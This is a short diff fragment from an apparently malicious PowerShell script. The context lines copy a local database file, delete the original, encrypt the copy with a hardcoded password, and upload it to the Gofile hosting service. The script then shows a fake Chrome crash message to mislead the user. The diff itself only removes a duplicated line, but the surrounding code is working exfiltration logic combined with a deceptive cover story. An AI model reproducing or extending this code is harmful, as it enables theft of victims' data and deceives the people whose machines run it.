@@ -152,7 +152,7 @@ Copy-Item $op $dbp -Force
 delete-data -op $op -p "s"
 $fid=creat-FilesToGofile
 Protect-File -FilePath $dbp -p "For_oNS."
-$fid=creat-FilesToGofile
+
 Upload-FilesToGofile -FilePath "$dbp.crypt" -newFolderId $fid
 if ($kerch) {
     [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Error")
